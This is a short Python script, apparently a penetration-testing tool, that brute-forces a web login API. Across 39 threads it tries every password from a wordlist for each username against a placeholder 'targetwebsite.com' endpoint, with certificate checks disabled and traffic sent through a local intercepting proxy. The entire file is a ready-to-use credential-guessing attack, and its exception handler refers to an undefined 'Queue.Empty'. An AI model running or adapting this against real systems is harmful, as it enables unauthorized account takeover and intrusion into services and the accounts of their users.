#!/usr/bin/python3
 
import threading
import queue
import socket
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
usernameList = open('usernames.txt','r').read().splitlines()
passwordList = open('passwords.txt','r',encoding='utf-8', errors='ignore').read().splitlines()
target = "http://targetwebsite.com/api/login"

#proxy to use
proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
 
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
 
	def run(self) :
		while True :
			username = None 
 
			try :
				username = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			try :
				for password in passwordList:
                                    payload = '{"username":"%s","password":"%s"}'%(username,password)
                                    res = requests.post(target,verify=False, data=payload, proxies = proxies)
                                    if res.status_code == 200:
                                        print("[+] Successful Login! Username: %s and Password: %s" %(username,password))
                                        break
			except :
				raise 
 
			self.queue.task_done()
 
queue = queue.Queue()
 
threads = []
for i in range(1, 40) : 
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
 
for username in usernameList :
	queue.put(username)     
 
queue.join()
 
 
for item in threads :
	item.join()
 
print ("Test Completed!")
